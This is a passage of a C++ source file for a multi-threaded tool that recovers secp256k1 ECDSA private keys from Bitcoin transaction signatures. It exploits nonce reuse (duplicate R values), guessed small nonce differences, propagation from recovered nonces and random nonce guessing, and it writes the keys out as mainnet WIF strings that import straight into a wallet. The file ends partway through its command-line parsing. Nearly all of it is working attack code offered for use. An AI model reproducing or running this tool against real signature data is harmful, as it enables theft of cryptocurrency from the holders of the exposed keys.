// ecdsa_recover_strict.cpp
// One-file, strict, multi-threaded ECDSA recovery with:
// - streaming bucketization (LRU writers) by pub (fallback r)
// - primary dup-R (s1±s2) with strict checks
// - delta-gradient/step scan (same pub, optional nopub)
// - iterative propagation (d -> k -> r -> d) with strict checks
// - random-k scanner using all CPU cores
// - preload recovered_k.jsonl
// Build:
//   g++ -O3 -march=native -flto -fexceptions -pthread -std=c++17 \
//       ecdsa_recover_strict.cpp -o ecdsa_recover_strict \
//       -lsecp256k1 -lcrypto -lpthread -Wno-deprecated-declarations

#include <bits/stdc++.h>
#include <secp256k1.h>
#include <openssl/sha.h>

using namespace std;

// --------- boost::multiprecision for 256-bit math ----------
#include <boost/multiprecision/cpp_int.hpp>
using boost::multiprecision::cpp_int;

#include <filesystem>
namespace fs = std::filesystem;


// secp256k1 order n
static const cpp_int N = cpp_int("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");

// --------- util: hex/bytes ----------
static inline int hexval(char c){
    if('0'<=c && c<='9') return c-'0';
    if('a'<=c && c<='f') return 10+c-'a';
    if('A'<=c && c<='F') return 10+c-'A';
    return -1;
}
static vector<uint8_t> from_hex(const string& s){
    string t=s;
    if(!t.empty() && t[0]=='"') t=t.substr(1,t.size()-2);
    if(t.rfind("0x",0)==0) t=t.substr(2);
    vector<uint8_t> out; out.reserve((t.size()+1)/2);
    int nib=-1;
    for(char c: t){
        int v=hexval(c);
        if(v<0) continue;
        if(nib<0) nib=v;
        else { out.push_back((nib<<4)|v); nib=-1; }
    }
    if(nib>=0) out.push_back(nib);
    return out;
}
static string to_hex(const vector<uint8_t>& b){
    static const char* H="0123456789abcdef";
    string s; s.reserve(b.size()*2);
    for(uint8_t x: b){ s.push_back(H[(x>>4)&15]); s.push_back(H[x&15]); }
    return s;
}
static string hex_pad64(const string& h){ // lower, 64 hex chars
    string t=h;
    if(t.rfind("0x",0)==0) t=t.substr(2);
    for(auto& c:t) c=tolower(c);
    if(t.size()<64) t=string(64-t.size(),'0')+t;
    return t;
}
static cpp_int hex_to_int(const string& h){
    cpp_int x=0;
    string t=h;
    if(!t.empty() && t[0]=='"') t=t.substr(1,t.size()-2);
    if(t.rfind("0x",0)==0) t=t.substr(2);
    for(char c: t){
        int v=hexval(c);
        if(v>=0){ x <<= 4; x += v; }
    }
    return x;
}
static string int_to_hex64(const cpp_int& x){
    cpp_int t = x % N;
    vector<uint8_t> b(32,0);
    for(int i=31;i>=0;--i){ b[i] = (uint8_t)(t & 0xff); t >>= 8; }
    return to_hex(b);
}
static void int_to_32be(const cpp_int& x, unsigned char out[32]){
    cpp_int t=x; // not reduced here intentionally in some places; caller may mod N
    for(int i=31;i>=0;--i){ out[i] = (uint8_t)(t & 0xff); t >>= 8; }
}

// --------- base58 + WIF ----------
static const char* B58="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
static string b58enc(const vector<uint8_t>& data){
    // big integer division by 58
    vector<uint8_t> tmp = data;
    // count leading zeros
    int zeros=0; while(zeros<(int)tmp.size() && tmp[zeros]==0) zeros++;
    vector<char> enc;
    vector<uint8_t> num = tmp;
    while(!num.empty() && !(num.size()==1 && num[0]==0)){
        // divide by 58
        vector<uint8_t> q; q.reserve(num.size());
        int rem=0;
        for(uint8_t d: num){
            int cur = (rem<<8) + d;
            int qd = cur / 58;
            rem = cur % 58;
            if(!q.empty() || qd!=0) q.push_back((uint8_t)qd);
        }
        enc.push_back(B58[rem]);
        num.swap(q);
    }
    string s; s.reserve(zeros + enc.size());
    s.append(zeros,'1');
    for(int i=(int)enc.size()-1;i>=0;--i) s.push_back(enc[i]);
    return s;
}
static void sha256_once(const unsigned char* in, size_t len, unsigned char out[32]){
    SHA256_CTX ctx; SHA256_Init(&ctx); SHA256_Update(&ctx,in,len); SHA256_Final(out,&ctx);
}
static string to_wif(const cpp_int& d, bool compressed=true, bool mainnet=true){
    vector<uint8_t> payload; payload.reserve(34);
    payload.push_back(mainnet?0x80:0xEF);
    unsigned char buf[32]; int_to_32be(d, buf); payload.insert(payload.end(), buf, buf+32);
    if(compressed) payload.push_back(0x01);
    unsigned char h1[32], h2[32];
    sha256_once(payload.data(), payload.size(), h1);
    sha256_once(h1,32,h2);
    vector<uint8_t> full = payload; full.insert(full.end(), h2, h2+4);
    return b58enc(full);
}

// --------- math mod N (cpp_int) ----------
static inline cpp_int modn(cpp_int a){ a%=N; if(a<0) a+=N; return a; }
static cpp_int egcd_inv(cpp_int a){
    // extended Euclid
    cpp_int t=0, newt=1;
    cpp_int r=N, newr = modn(a);
    while(newr!=0){
        cpp_int q = r / newr;
        cpp_int tmp;
        tmp = t - q*newt; t=newt; newt=tmp;
        tmp = r - q*newr; r=newr; newr=tmp;
    }
    if(r>1) return 0; // not invertible
    if(t<0) t += N;
    return t;
}

// --------- secp256k1 helpers ----------
struct Secp {
    secp256k1_context* ctx;
    Secp(){ ctx = secp256k1_context_create(SECP256K1_CONTEXT_SIGN|SECP256K1_CONTEXT_VERIFY); }
    ~Secp(){ secp256k1_context_destroy(ctx); }
};
static bool priv_to_pub_hex(Secp& S, const cpp_int& d, string& out_compr, string& out_uncompr){
    unsigned char seckey[32]; int_to_32be(modn(d), seckey);
    secp256k1_pubkey pk;
    if(!secp256k1_ec_pubkey_create(S.ctx, &pk, seckey)) return false;
    unsigned char out33[33]; size_t len=33;
    secp256k1_ec_pubkey_serialize(S.ctx, out33, &len, &pk, SECP256K1_EC_COMPRESSED);
    out_compr = to_hex(vector<uint8_t>(out33, out33+len));
    unsigned char out65[65]; len=65;
    secp256k1_ec_pubkey_serialize(S.ctx, out65, &len, &pk, SECP256K1_EC_UNCOMPRESSED);
    out_uncompr = to_hex(vector<uint8_t>(out65, out65+len));
    return true;
}
static bool k_to_r_x(Secp& S, const cpp_int& k, cpp_int& r_out){
    unsigned char seckey[32]; int_to_32be(modn(k), seckey);
    secp256k1_pubkey R;
    if(!secp256k1_ec_pubkey_create(S.ctx, &R, seckey)) return false;
    unsigned char out33[33]; size_t len=33;
    secp256k1_ec_pubkey_serialize(S.ctx, out33, &len, &R, SECP256K1_EC_COMPRESSED);
    // out33 = 0x02/0x03 || X (32 bytes)
    vector<uint8_t> X(out33+1, out33+33);
    r_out = hex_to_int(to_hex(X));
    r_out = modn(r_out);
    return true;
}

// --------- signature row ----------
struct Row {
    string txid; int vin=0;
    cpp_int r,s,z;
    string r_hex;  // cache 64-hex
    string pub;    // hex (33/65) lower
};
static bool parse_line_to_row(const string& line, Row& out){
    // extremely permissive line jsonl extractor
    auto get_str = [&](const string& key)->string{
        size_t i=line.find("\""+key+"\"");
        if(i==string::npos) return "";
        i=line.find(':',i); if(i==string::npos) return "";
        size_t j=line.find_first_of("\"0123456789-[{tfn", i+1);
        if(j==string::npos) return "";
        if(line[j]=='"'){ // string
            size_t k=line.find('"', j+1);
            // handle escaped quotes minimally
            while(k!=string::npos && line[k-1]=='\\') k=line.find('"', k+1);
            if(k==string::npos) return "";
            return line.substr(j+1, k-(j+1));
        }else{
            // number?
            size_t k=j;
            while(k<line.size() && !strchr(",}] \t\r\n", line[k])) k++;
            return line.substr(j, k-j);
        }
    };
    try{
        string rs = get_str("r"); string ss=get_str("s"); string zs=get_str("z");
        if(rs.empty()||ss.empty()||zs.empty()) return false;
        out.r = hex_to_int(rs); out.s = hex_to_int(ss); out.z = hex_to_int(zs);
        if(out.r<=0 || out.r>=N || out.s<=0 || out.s>=N) return false;
        out.r_hex = int_to_hex64(out.r);
        string pub = get_str("pubkey_hex"); if(pub.empty()) pub=get_str("pub");
        for(char& c: pub) c=tolower(c);
        out.pub = pub;
        string vin = get_str("vin"); out.vin = vin.empty()?0:stoi(vin);
        out.txid = get_str("txid");
        return true;
    }catch(...){ return false; }
}

// --------- LRU bucket writers ----------
struct LruWriters {
    size_t cap;
    string dir;
    unordered_map<string, FILE*> open;
    deque<string> order; // LRU
    LruWriters(size_t cap_, string dir_):cap(cap_),dir(std::move(dir_)){}
    ~LruWriters(){ close_all(); }
    void touch(const string& k){
        auto it=find(order.begin(), order.end(), k);
        if(it!=order.end()) order.erase(it);
        order.push_back(k);
    }
    FILE* get(const string& bkey){
        auto it=open.find(bkey);
        if(it!=open.end()){ touch(bkey); return it->second; }
        // open new
        string path = dir + "/" + bkey + ".jsonl";
        FILE* f = fopen(path.c_str(), "ab");
        if(!f) return nullptr;
        open[bkey]=f; touch(bkey);
        // evict
        while(open.size()>cap){
            string victim = order.front(); order.pop_front();
            auto iv=open.find(victim);
            if(iv!=open.end()){ fclose(iv->second); open.erase(iv); }
        }
        return f;
    }
    void write(const string& bkey, const string& line){
        FILE* f = get(bkey); if(!f) return;
        fwrite(line.data(), 1, line.size(), f);
        fputc('\n', f);
    }
    void close_all(){
        for(auto& kv: open) fclose(kv.second);
        open.clear(); order.clear();
    }
};

// --------- bucketing ----------
static string bucket_key_pub_first(const Row& r){
    if(!r.pub.empty()){
        string p = r.pub.substr(0, min<size_t>(4, r.pub.size()));
        return "p_" + p;
    }
    return "r_" + r.r_hex.substr(0,4);
}
static string bucket_key_r_first(const Row& r){
    return "r_" + r.r_hex.substr(0,4);
}
struct BucketSummary{ vector<string> files; size_t total=0; unordered_map<string,uint32_t> r_hist; };
static BucketSummary bucketize_stream(const string& sigs, const string& tmpdir,
                                      const string& buckets_by, size_t lru_cap=256){
    BucketSummary sum; sum.total=0;
    LruWriters writers(lru_cap, tmpdir);
    // track seen file names
    unordered_set<string> seen;
    auto get_bk = [&](const Row& r){
        return (buckets_by=="pub")? bucket_key_pub_first(r): bucket_key_r_first(r);
    };

    ifstream in(sigs);
    string line;
    while(getline(in,line)){
        Row r; if(!parse_line_to_row(line, r)) continue;
        // histogram r
        sum.r_hist[r.r_hex] += 1;
        string bkey = get_bk(r);
        // open & write compact
        char buf[512];
        string pub=r.pub.empty()?"":r.pub;
        snprintf(buf,sizeof(buf),
            "{\"txid\":\"%s\",\"vin\":%d,\"r\":\"%s\",\"s\":\"%s\",\"z\":\"%s\",\"pub\":\"%s\"}",
            r.txid.c_str(), r.vin, r.r_hex.c_str(), int_to_hex64(r.s).c_str(),
            int_to_hex64(r.z).c_str(), pub.c_str());
        writers.write(bkey, buf);
        sum.total++;
        seen.insert(bkey);
    }
    writers.close_all();
    for(auto& k: seen) sum.files.push_back(tmpdir + "/" + k + ".jsonl");
    return sum;
}
static vector<Row> read_bucket(const string& fp){
    vector<Row> out;
    ifstream in(fp);
    string line;
    unordered_set<string> seen; // dedup by (txid|vin|pub|r|s)
    while(getline(in,line)){
        Row r; if(!parse_line_to_row(line,r)) continue;
        string key = r.txid + "|" + to_string(r.vin) + "|" + r.pub + "|" + r.r_hex + "|" + int_to_hex64(r.s);
        if(seen.insert(key).second) out.push_back(std::move(r));
    }
    return out;
}

// --------- strict checks ----------
static bool pub_matches(Secp& S, const cpp_int& d, const string& pubhex){
    if(pubhex.empty()) return true;
    string c,u; if(!priv_to_pub_hex(S,d,c,u)) return false;
    string tgt = pubhex; string lc=tgt;
    for(char& ch: lc) ch=tolower(ch);
    return (lc==c || lc==u);
}
static bool ecdsa_equation_ok(const Row& sig, const cpp_int& d, cpp_int& k_out){
    // k = (z + r*d)/s mod n
    cpp_int rd = modn(sig.r * d);
    cpp_int num = modn(sig.z + rd);
    cpp_int invs = egcd_inv(sig.s); if(invs==0) return false;
    cpp_int k = modn(num * invs);
    if(k==0) return false;
    // equation check: (1/k) * (z + r*d) == s mod n
    cpp_int invk = egcd_inv(k); if(invk==0) return false;
    cpp_int lhs = modn(invk * num);
    if(lhs != modn(sig.s)) return false;
    k_out = k;
    return true;
}
static bool r_matches_k(Secp& S, const cpp_int& k, const cpp_int& r){
    cpp_int rx; if(!k_to_r_x(S,k,rx)) return false;
    return (modn(rx) == modn(r));
}

// --------- emit outputs ----------
static mutex g_out_mu;
static void emit_key(const string& out_json, const string& out_txt,
                     const string& method,
                     const cpp_int& d, const string& pub_for_out,
                     const vector<pair<string,int>>& proof,
                     const cpp_int* r_opt=nullptr){
    string wif = to_wif(d,true,true);
    string dhex = int_to_hex64(d);
    {
        lock_guard<mutex> lk(g_out_mu);
        // json
        {
            ofstream f(out_json, ios::app);
            f << "{\"pubkey\":\"" << pub_for_out
              << "\",\"priv_hex\":\"" << dhex
              << "\",\"wif\":\"" << wif
              << "\",\"method\":\"" << method << "\",\"proof\":[";
            for(size_t i=0;i<proof.size();++i){
                if(i) f<<",";
                f << "{\"txid\":\""<<proof[i].first<<"\",\"vin\":"<<proof[i].second<<"}";
            }
            if(r_opt){ f << "],\"r\":\""<< int_to_hex64(*r_opt) <<"\"}\n"; }
            else{ f << "]}\n"; }
        }
        // txt
        {
            ofstream f(out_txt, ios::app);
            f << "PUB="<< pub_for_out <<" PRIV="<< dhex <<" WIF="<< wif;
            if(!proof.empty()){
                f << " via ";
                for(size_t i=0;i<proof.size();++i){
                    if(i) f << " & ";
                    f << proof[i].first << ":" << proof[i].second;
                }
            }
            if(r_opt) f << " R="<< int_to_hex64(*r_opt);
            f << " ("<<method<<")\n";
        }
    }
}
static void emit_k_candidates(const string& out_k, const cpp_int& r, const vector<cpp_int>& ks){
    lock_guard<mutex> lk(g_out_mu);
    ofstream f(out_k, ios::app);
    f << "{\"r\":\""<< int_to_hex64(r) <<"\",\"k_candidates\":[";
    for(size_t i=0;i<ks.size();++i){
        if(i) f<<",";
        f << "\""<< int_to_hex64(ks[i]) <<"\"";
    }
    f << "]}\n";
}
static void emit_delta_hit(const string& out_deltas, const string& pub,
                           const Row& a, const Row& b, const cpp_int& delta, const string& why){
    lock_guard<mutex> lk(g_out_mu);
    ofstream f(out_deltas, ios::app);
    f << "{\"pubkey\":\""<< pub <<"\",\"delta_hex\":\""<< int_to_hex64(delta)
      << "\",\"pair\":[{\"r\":\""<<a.r_hex<<"\",\"s\":\""<<int_to_hex64(a.s)
      << "\",\"z\":\""<<int_to_hex64(a.z)<<"\"},{\"r\":\""<<b.r_hex<<"\",\"s\":\""
      << int_to_hex64(b.s)<<"\",\"z\":\""<<int_to_hex64(b.z)<<"\"}],\"why\":\""<<why<<"\"}\n";
}

// --------- primary dup-R ----------
static size_t primary_dup_r(Secp& S,
                            const vector<Row>& rows,
                            const string& out_json, const string& out_txt,
                            unordered_map<string, cpp_int>& recovered_by_pub,
                            unordered_map<string, unordered_set<string>>& k_by_r_hex){
    // group (r_hex, pub)
    unordered_map<string, vector<int>> idx;
    for(int i=0;i<(int)rows.size();++i){
        if(rows[i].pub.empty()) continue;
        string key = rows[i].r_hex + "|" + rows[i].pub;
        idx[key].push_back(i);
    }
    size_t found=0;
    for(auto& kv: idx){
        auto& v = kv.second;
        if(v.size()<2) continue;
        for(size_t a=0;a<v.size();++a){
            for(size_t b=a+1;b<v.size();++b){
                const Row& A=rows[v[a]], &B=rows[v[b]];
                // two paths: denom=(s1-s2) or (s1+s2)
                vector<pair<string, cpp_int>> k_cands;
                // k = (z1 - z2)/(s1 - s2)
                cpp_int d1 = modn(A.s - B.s); if(d1!=0){
                    cpp_int invd = egcd_inv(d1);
                    if(invd!=0){
                        cpp_int k = modn((A.z - B.z) * invd);
                        k_cands.push_back({"diff", k});
                    }
                }
                // k2 = (z1 + z2)/(s1 + s2)
                cpp_int d2 = modn(A.s + B.s); if(d2!=0){
                    cpp_int invd = egcd_inv(d2);
                    if(invd!=0){
                        cpp_int k2 = modn((A.z + B.z) * invd);
                        k_cands.push_back({"sum", k2});
                    }
                }
                for(auto& it: k_cands){
                    cpp_int k = it.second; if(k==0) continue;
                    // d = (s1*k - z1)/r
                    cpp_int num = modn(A.s*k - A.z);
                    cpp_int rinv = egcd_inv(A.r); if(rinv==0) continue;
                    cpp_int d = modn(num * rinv);
                    // strict checks:
                    if(!pub_matches(S, d, A.pub)) continue;
                    cpp_int kA; if(!ecdsa_equation_ok(A,d,kA)) continue;
                    cpp_int kB; if(!ecdsa_equation_ok(B,d,kB)) continue;
                    if(!r_matches_k(S, kA, A.r)) continue;
                    if(!r_matches_k(S, kB, B.r)) continue;

                    if(recovered_by_pub.count(A.pub)==0){
                        recovered_by_pub[A.pub]=d;
                        emit_key(out_json, out_txt, string("primary-")+it.first, d, A.pub,
                                 {{A.txid,A.vin},{B.txid,B.vin}}, &A.r);
                        // seed k for both r (k and n-k)
                        k_by_r_hex[A.r_hex].insert(int_to_hex64(kA));
                        k_by_r_hex[A.r_hex].insert(int_to_hex64(modn(N-kA)));
                        k_by_r_hex[B.r_hex].insert(int_to_hex64(kB));
                        k_by_r_hex[B.r_hex].insert(int_to_hex64(modn(N-kB)));
                        found++;
                    }
                }
            }
        }
    }
    return found;
}

// --------- delta solve ----------
static bool delta_solve_pair(const Row& a, const Row& b, const cpp_int& delta, cpp_int& d_out){
    // d = (δ - (B2 - B1)) * (A2 - A1)^{-1}
    // A = s^{-1}*r, B = s^{-1}*z
    cpp_int invs1 = egcd_inv(a.s); if(invs1==0) return false;
    cpp_int invs2 = egcd_inv(b.s); if(invs2==0) return false;
    cpp_int A1 = modn(invs1 * a.r), B1 = modn(invs1 * a.z);
    cpp_int A2 = modn(invs2 * b.r), B2 = modn(invs2 * b.z);
    cpp_int denom = modn(A2 - A1); if(denom==0) return false;
    cpp_int invd = egcd_inv(denom); if(invd==0) return false;
    cpp_int num = modn(delta - modn(B2 - B1));
    cpp_int d = modn(num * invd);
    if(d==0) return false;
    d_out = d;
    return true;
}

static size_t delta_scan_bucket(Secp& S,
                                const vector<Row>& rows,
                                const vector<cpp_int>& deltas_schedule,
                                size_t per_pair_cap,
                                bool nopub_mode,
                                const string& out_json, const string& out_txt, const string& out_deltas,
                                unordered_map<string, cpp_int>& recovered_by_pub,
                                unordered_map<string, unordered_set<string>>& k_by_r_hex){
    // group by pub (or single group)
    unordered_map<string, vector<int>> groups;
    for(int i=0;i<(int)rows.size();++i){
        string key = (!nopub_mode && !rows[i].pub.empty())? rows[i].pub : "_ALL_";
        groups[key].push_back(i);
    }
    size_t found=0;
    for(auto& kv: groups){
        auto& idx = kv.second; if(idx.size()<2) continue;
        for(size_t a=0; a<idx.size(); ++a){
            for(size_t b=a+1; b<idx.size(); ++b){
                const Row& A = rows[idx[a]], &B = rows[idx[b]];
                if(A.r_hex == B.r_hex) continue; // dup-R goes in primary
                size_t tried=0;
                for(const cpp_int& delta : deltas_schedule){
                    if(tried++ >= per_pair_cap) break;
                    cpp_int d; if(!delta_solve_pair(A,B,delta,d)) continue;
                    // strict check:
                    cpp_int kA,kB;
                    if(!ecdsa_equation_ok(A,d,kA)) continue;
                    if(!ecdsa_equation_ok(B,d,kB)) continue;
                    if(!r_matches_k(S, kA, A.r)) continue;
                    if(!r_matches_k(S, kB, B.r)) continue;

                    string pub_out;
                    if(!nopub_mode){
                        if(!pub_matches(S, d, A.pub)) continue;
                        pub_out = A.pub;
                    }else{
                        string c,u; if(!priv_to_pub_hex(S,d,c,u)) continue;
                        pub_out = c; // compressed
                    }
                    if(recovered_by_pub.count(pub_out)==0){
                        recovered_by_pub[pub_out] = d;
                        emit_key(out_json, out_txt, "delta-scan", d, pub_out,
                                 {{A.txid,A.vin},{B.txid,B.vin}});
                        emit_delta_hit(out_deltas, pub_out, A, B, delta, "delta");
                        // seed k’s
                        k_by_r_hex[A.r_hex].insert(int_to_hex64(kA));
                        k_by_r_hex[A.r_hex].insert(int_to_hex64(modn(N-kA)));
                        k_by_r_hex[B.r_hex].insert(int_to_hex64(kB));
                        k_by_r_hex[B.r_hex].insert(int_to_hex64(modn(N-kB)));
                        found++;
                        break; // next pair
                    }
                }
            }
        }
    }
    return found;
}

// --------- propagation one streaming pass ----------
static pair<size_t,size_t> propagate_stream(Secp& S, const string& sigs_path,
                                unordered_map<string, cpp_int>& recovered_by_pub,
                                unordered_map<string, unordered_set<string>>& k_by_r_hex,
                                const string& out_json, const string& out_txt){
    size_t new_k=0, new_d=0;
    unordered_set<string> seen_dhex; for(auto& kv: recovered_by_pub) seen_dhex.insert(int_to_hex64(kv.second));

    ifstream in(sigs_path);
    string line;
    while(getline(in,line)){
        Row r; if(!parse_line_to_row(line,r)) continue;
        // if pub known -> compute k, seed r
        if(!r.pub.empty()){
            auto it = recovered_by_pub.find(r.pub);
            if(it!=recovered_by_pub.end()){
                cpp_int d = it->second;
                cpp_int k; if(!ecdsa_equation_ok(r,d,k)) continue;
                // r==x(k·G) check just to be safe:
                if(!r_matches_k(S, k, r.r)) continue;
                auto& Sset = k_by_r_hex[r.r_hex];
                size_t before = Sset.size();
                Sset.insert(int_to_hex64(k));
                Sset.insert(int_to_hex64(modn(N-k)));
                new_k += (Sset.size() - before);
            }
        }
        // if r has k candidates -> try to solve d
        auto it2 = k_by_r_hex.find(r.r_hex);
        if(it2 != k_by_r_hex.end()){
            for(const string& khex: it2->second){
                cpp_int k = hex_to_int(khex);
                cpp_int rinv = egcd_inv(r.r); if(rinv==0) continue;
                cpp_int d = modn((r.s * k - r.z) * rinv);
                string dhex = int_to_hex64(d);
                if(seen_dhex.count(dhex)) continue;
                // strict: check eq + r==x(kG)
                cpp_int kchk; if(!ecdsa_equation_ok(r,d,kchk)) continue;
                if(kchk!=k) continue; // must match the candidate
                if(!r_matches_k(S, k, r.r)) continue;
                string pub_out;
                if(!r.pub.empty()){
                    if(!pub_matches(S, d, r.pub)) continue;
                    pub_out = r.pub;
                }else{
                    string c,u; if(!priv_to_pub_hex(S,d,c,u)) continue;
                    pub_out = c;
                }
                seen_dhex.insert(dhex);
                recovered_by_pub[pub_out]=d;
                emit_key(out_json,out_txt,"propagate-from-r", d, pub_out, {{r.txid,r.vin}}, &r.r);
                new_d++;
            }
        }
    }
    return {new_k,new_d};
}

// --------- preload recovered_k.jsonl ----------
static void preload_k(const string& path, unordered_map<string, unordered_set<string>>& k_by_r_hex){
    if(path.empty()) return;
    ifstream in(path);
    string line;
    size_t rows=0;
    while(getline(in,line)){
        if(line.empty()) continue;
        // expect: {"r":"...","k_candidates":[ "...", ... ]}
        size_t ir = line.find("\"r\"");
        size_t ik = line.find("\"k_candidates\"");
        if(ir==string::npos || ik==string::npos) continue;
        // crude parse:
        size_t q1=line.find('"', ir+3); q1=line.find('"', q1+1);
        size_t q2=line.find('"', q1+1); // start
        size_t q3=line.find('"', q2+1);
        string r = line.substr(q2+1, q3-(q2+1));
        r = hex_pad64(r);
        size_t lb = line.find('[', ik), rb=line.find(']', lb);
        if(lb==string::npos||rb==string::npos) continue;
        string arr=line.substr(lb+1, rb-(lb+1));
        string cur; unordered_set<string> &S = k_by_r_hex[r];
        for(char c: arr){
            if(c=='"'){ // toggle
                if(!cur.empty()){
                    S.insert(hex_pad64(cur));
                    cur.clear();
                }else{
                    cur.clear();
                }
            }else{
                if(c!=' ' && c!=',') cur.push_back(c);
            }
        }
        rows++;
    }
    cerr << "[preload-k] loaded " << rows << " rows from " << path << "\n";
}

// --------- delta schedule helper ----------
static vector<cpp_int> build_delta_schedule(const vector<uint64_t>& seeds, uint64_t max_delta,
                                            uint64_t fill_step, const vector<uint64_t>& step_seeds,
                                            size_t per_pair_cap){
    vector<uint64_t> v;
    auto push_unique=[&](uint64_t x){
        if(x==0 || x>max_delta) return;
        if(find(v.begin(),v.end(),x)==v.end()) v.push_back(x);
    };
    for(uint64_t s: seeds) push_unique(s);
    if(fill_step>0){
        for(uint64_t d=1; d<=max_delta && v.size()<per_pair_cap; d+=fill_step) push_unique(d);
    }
    for(uint64_t base: step_seeds){
        for(uint64_t t=1; ;++t){
            uint64_t d = base*t;
            if(d>max_delta) break;
            if(v.size()>=per_pair_cap) break;
            push_unique(d);
        }
    }
    vector<cpp_int> out; out.reserve(v.size());
    for(uint64_t x: v){ cpp_int t=x; out.push_back(t); }
    return out;
}

// --------- random-k scan ----------
struct RCount{ string r_hex; uint32_t cnt; };
static vector<RCount> pick_top_r(const unordered_map<string,uint32_t>& hist, size_t topN){
    vector<RCount> v; v.reserve(hist.size());
    for(auto& kv: hist) v.push_back({kv.first, kv.second});
    sort(v.begin(), v.end(), [](auto& a, auto& b){ return a.cnt>b.cnt;});
    if(topN>0 && v.size()>topN) v.resize(topN);
    return v;
}
static void random_k_worker(Secp& S,
                            const vector<RCount>& targets,
                            const string& sigs_path,
                            uint64_t per_bucket,
                            cpp_int range_cap,
                            uint64_t seed,
                            unordered_map<string, cpp_int>& recovered_by_pub,
                            unordered_map<string, unordered_set<string>>& k_by_r_hex,
                            const string& out_json, const string& out_txt,
                            atomic<size_t>& new_keys){
    // index signatures by r (stream), but only for target r’s to keep RAM low
    unordered_set<string> wanted;
    for(auto& rc: targets) wanted.insert(rc.r_hex);
    unordered_map<string, vector<Row>> by_r;
    {
        ifstream in(sigs_path);
        string line;
        while(getline(in,line)){
            Row r; if(!parse_line_to_row(line,r)) continue;
            if(wanted.count(r.r_hex)) by_r[r.r_hex].push_back(std::move(r));
        }
    }
    std::mt19937_64 rng(seed);
    for(const auto& rc: targets){
        auto it = by_r.find(rc.r_hex); if(it==by_r.end()) continue;
        const auto& rows = it->second; if(rows.empty()) continue;
        for(uint64_t i=0;i<per_bucket;i++){
            // uniform in [1..range_cap], cap by N-1
            cpp_int K = cpp_int(rng())<<64 ^ cpp_int(rng());
            K %= (range_cap % N); if(K==0) K=1;
            // pick first row (any is fine) to compute d; verify against all rows of that r
            const Row& a = rows[0];
            cpp_int rinv = egcd_inv(a.r); if(rinv==0) continue;
            cpp_int d = modn((a.s*K - a.z) * rinv);
            // must pass strict checks on ALL rows with same r (same k!)
            bool ok=true;
            for(const Row& r : rows){
                // for same r, k must be identical
                cpp_int k2 = K;
                if(!ecdsa_equation_ok(r,d,k2)) { ok=false; break; }
                if(k2!=K){ ok=false; break; }
                if(!r_matches_k(S, K, r.r)){ ok=false; break; }
            }
            if(!ok) continue;
            string pub_out;
            if(!rows[0].pub.empty()){
                if(!pub_matches(S,d,rows[0].pub)) continue;
                pub_out = rows[0].pub;
            }else{
                string c,u; if(!priv_to_pub_hex(S,d,c,u)) continue;
                pub_out = c;
            }
            if(recovered_by_pub.insert({pub_out,d}).second){
                emit_key(out_json,out_txt,"random-k", d, pub_out, {{rows[0].txid,rows[0].vin}}, &rows[0].r);
                // seed k (and n-k)
                k_by_r_hex[rc.r_hex].insert(int_to_hex64(K));
                k_by_r_hex[rc.r_hex].insert(int_to_hex64(modn(N-K)));
                new_keys++;
            }
        }
    }
}

// --------- clusters/collisions reports (optional) ----------
static void export_clusters_and_collisions(const string& sigs_path,
                                           const string& export_clusters_path,
                                           const string& report_collisions_path,
                                           int min_count){
    // clusters: (r,pub) count>=min
    // collisions: same r across >=2 pubs
    unordered_map<string,int> cluster;
    unordered_map<string, unordered_set<string>> r2pubs;
    ifstream in(sigs_path);
    string line;
    while(getline(in,line)){
        Row r; if(!parse_line_to_row(line,r)) continue;
        string key = r.r_hex + "|" + r.pub;
        cluster[key]++;
        if(!r.pub.empty()) r2pubs[r.r_hex].insert(r.pub);
    }
    // write clusters
    if(!export_clusters_path.empty()){
        ofstream f(export_clusters_path);
        for(auto& kv: cluster){
            if(kv.second < max(2,min_count)) continue;
            auto pos = kv.first.find('|');
            string rhex = kv.first.substr(0,pos);
            string pub  = kv.first.substr(pos+1);
            f << "{\"r\":\""<<rhex<<"\",\"pubkey\":\""<<pub<<"\",\"count\":"<<kv.second<<"}\n";
        }
    }
    // write collisions
    if(!report_collisions_path.empty()){
        ofstream f(report_collisions_path);
        for(auto& kv: r2pubs){
            if(kv.second.size()>=2){
                f << "{\"r\":\""<<kv.first<<"\",\"pubkeys\":[";
                bool first=true;
                for(auto& p: kv.second){ if(!first) f<<","; first=false; f<<"\""<<p<<"\""; }
                f << "]}\n";
            }
        }
    }
}

// --------- CLI args ----------
struct Args{
    string sigs="signatures.jsonl";
    string tmpdir="";
    string buckets_by="pub";
    int threads=max(1,(int)std::thread::hardware_concurrency());
    int min_count=0;
    // outputs
    string out_json="recovered_keys.jsonl";
    string out_txt="recovered_keys.txt";
    string out_k="recovered_k.jsonl";
    string out_deltas="delta_insights.jsonl";
    string export_clusters="", report_collisions="";
    // delta
    uint64_t dg_max_delta=65536;
    vector<uint64_t> dg_seeds={1,2,4,8,16,32,64,128,256,512,1024};
    uint64_t dg_fill_step=1;
    uint64_t dg_per_pair_cap=4096;
    vector<uint64_t> step_seeds={3,5,7,9,17};
    bool enable_nopub=false;
    int max_iter=2;
    // preload k
    string preload_k_path="";
    // random-k
    uint64_t scan_random_k=0;
    size_t scan_random_k_top=0; // 0 = all
    cpp_int scan_random_k_range = N-1; // cap
    uint64_t rand_seed=1337;
};
static vector<uint64_t> parse_u64_list(const string& s){
    vector<uint64_t> v;
    string t=s; if(t.empty()) return v;
    string cur;
    for(char c: t){
        if(c==','||isspace((unsigned char)c)){ if(!cur.empty()){ v.push_back(strtoull(cur.c_str(),nullptr,0)); cur.clear(); } }
        else cur.push_back(c);
    }
    if(!cur.empty()) v.push_back(strtoull(cur.c_str(),nullptr,0));
    return v;
}
static void parse_args(int argc, char** argv, Args& A){
    for(int i=1;i<argc;i++){
        string a=argv[i];
        auto need=[&](string& dst){ if(i+1<argc) dst=argv[++i]; };
        auto needi=[&](int& dst){ if(i+1<argc) dst=atoi(argv[++i]); };
        auto needu=[&](uint64_t& dst){ if(i+1<argc) dst=strtoull(argv[++i],nullptr,0); };
        if(a=="--sigs") need(A.sigs);
        else if(a=="--tmpdir") need(A.tmpdir);
        else if(a=="--buckets-by") need(A.buckets_by);
        else if(a=="--threads" || a=="--thread") needi(A.threads);
        else if(a=="--min-count") needi(A.min_count);
        else if(a=="--out-json") need(A.out_json);
        else if(a=="--out-txt") need(A.out_txt);
        else if(a=="--out-k") need(A.out_k);
